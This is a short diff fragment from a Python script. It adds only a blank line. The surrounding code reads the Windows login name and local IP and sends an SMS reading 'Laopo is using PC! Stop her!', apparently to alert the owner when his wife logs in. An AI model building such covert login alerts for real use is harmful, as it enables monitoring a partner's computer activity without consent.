@@ -122,6 +122,7 @@ if __name__ == '__main__':
     loguser = os.popen('echo %username%').readline()
     info = 'Laopo is using PC! Stop her!\nlogin as %s' %loguser
     sms = info + unicode(localipinfo).encode("UTF-8")
+
     while send_sms(fx_info, sms) == 0:
         time.sleep(5)
 
